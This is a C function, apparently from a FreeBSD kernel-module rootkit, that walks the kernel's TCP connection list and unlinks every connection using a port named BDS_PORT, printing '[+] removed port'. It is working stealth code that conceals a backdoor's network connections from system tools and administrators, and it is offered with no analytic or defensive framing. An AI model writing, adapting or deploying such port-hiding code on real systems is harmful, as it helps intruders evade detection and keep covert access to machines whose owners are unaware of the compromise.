static int bds_port_hiding(struct thread *td, void *args) {
	CURVNET_SET(vnet0);
	INP_INFO_WLOCK(&V_tcbinfo);
	struct inpcb *inp;
	CK_LIST_FOREACH(inp, V_tcbinfo.ipi_listhead, inp_list) {
		INP_RLOCK(inp);
		/*
		printf("local port : %d\n", ntohs(inp->inp_lport));
		printf("foreign port : %d\n", ntohs(inp->inp_fport));
		*/		
		if ( (ntohs(inp->inp_lport) == BDS_PORT) || (ntohs(inp->inp_fport) == BDS_PORT) ) {
			printf("[+] removed port");
			CK_LIST_REMOVE(inp, inp_list);
		}
		INP_RUNLOCK(inp);
	}
	INP_INFO_WUNLOCK(&V_tcbinfo);
	CURVNET_RESTORE();

	return 0;
}

